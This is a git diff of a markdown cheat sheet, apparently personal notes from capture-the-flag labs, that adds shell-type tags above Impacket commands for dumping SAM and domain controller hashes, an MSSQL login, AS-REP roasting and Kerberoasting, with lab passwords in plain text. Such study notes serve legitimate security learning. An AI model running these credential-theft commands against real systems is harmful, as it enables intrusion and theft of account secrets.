@@ -2,6 +2,7 @@
 
 ## Wreath Commands
 
+<!-- cmd: linux -->
 ```bash
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
@@ -10,6 +11,7 @@ Used on: **Wreath**
 extracted local NTLM hashes from saved SAM/SYSTEM hives.
 
 ### Dump credentials from DC
+<!-- cmd: linux -->
 ```bash
 impacket-secretsdump spookysec.local/backup:'backup2517860'@$TARGET
 ```
@@ -20,6 +22,7 @@ Python suite implementing Windows/AD network protocols (SMB, Kerberos, MSSQL, WM
 ## Commands Used
 
 ### Interactive MSSQL session with Windows authentication
+<!-- cmd: linux -->
 ```bash
 impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
 ```
@@ -32,6 +35,7 @@ enum_owner
 ```
 
 ### AS-REP Roasting
+<!-- cmd: linux -->
 ```bash
 impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
 ```
@@ -41,6 +45,7 @@ Used on: **Overwatch**
 - `-format hashcat` — output in hashcat-compatible format (mode 18200)
 
 ### Kerberoasting
+<!-- cmd: linux -->
 ```bash
 impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
 ```
